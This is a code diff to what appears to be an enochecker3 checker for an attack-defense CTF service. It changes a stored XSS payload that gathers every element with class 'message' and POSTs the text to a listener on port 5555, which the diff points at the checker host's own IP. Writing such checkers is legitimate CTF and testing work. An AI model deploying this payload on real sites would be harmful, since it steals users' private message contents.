@@ -2,7 +2,6 @@ import json
 import secrets
 from typing import Optional
 from httpx import AsyncClient
-import functools
 from logging import LoggerAdapter
 from enochecker3 import (
     ChainDB,
@@ -20,7 +19,7 @@ from selenium import webdriver
 from webdriver_manager.chrome import ChromeDriverManager
 from http.server import BaseHTTPRequestHandler, HTTPServer
 import threading
-from enochecker_test import main
+import socket
 
 
 HOST = "0.0.0.0"
@@ -112,7 +111,7 @@ async def getnoise0(task: GetnoiseCheckerTaskMessage, client: AsyncClient, db: C
     assert_in(noise, r.text, "noise missing from note")
 
 
-exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://localhost:5555/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
+exploitMessage = """<script>function getText(){let text='';let messages = document.getElementsByClassName('message');for(let i = 0; i < messages.length; i++){text += messages[i].innerHTML;}return text; }fetch('http://""" + socket.gethostbyname(socket.gethostname()) + """:5555/', {method: 'POST', body:'username=' + getText(),headers: { 'Content-Type': 'application/x-www-form-urlencoded', },}); </script>"""
 result = [None]
 
 webServer = [None]
